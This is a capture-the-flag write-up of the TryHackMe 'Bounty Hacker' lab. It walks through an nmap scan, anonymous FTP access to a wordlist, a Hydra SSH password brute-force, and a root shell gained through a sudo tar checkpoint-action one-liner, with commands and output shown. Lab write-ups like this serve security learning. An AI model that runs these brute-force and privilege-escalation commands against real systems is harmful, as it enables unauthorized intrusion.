---
title : Bounty Hacker - Writeup
---

_**Jan 02, 2021**_

[Bounty Hacker](https://tryhackme.com/room/cowboyhacker) Writeup

## Recon :

```
kali@kali:~$ nmap -sC -sV -Pn 10.10.100.236
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 13:19 EDT
Nmap scan report for 10.10.100.236
Host is up (0.60s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.3.179
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## FTP :

We noticed from the scan that `FTP` service is running, and `Anonymous login allowed` is enabled, So let's login and see what's inside :

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp>
```
` locks.txt` contains a wordlist that can help us to get user access.
`task.txt` contains some task, wirtten by a user called `lin`.

So enough said. We have a user & a wordlist, Let's `HYDRA`.

## SSH Brute Forcing :

```
kali@kali:~$ hydra -l lin -P locks.txt ssh://10.10.100.236
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-03 13:57:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.100.236:22/
[22][ssh] host: 10.10.100.236   login: lin   password: ******************
```

Nice. Now let's login with those creds!

## Privilege Escalation :

Enumerating manually we got something intresting, this user can run `/bin/tar` with root permission.

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
I went straight to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) and grabbed this one liner :

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```
And now we are `root`.

<br>
<br>
Best Regards

[bvr0n](https://github.com/bvr0n)
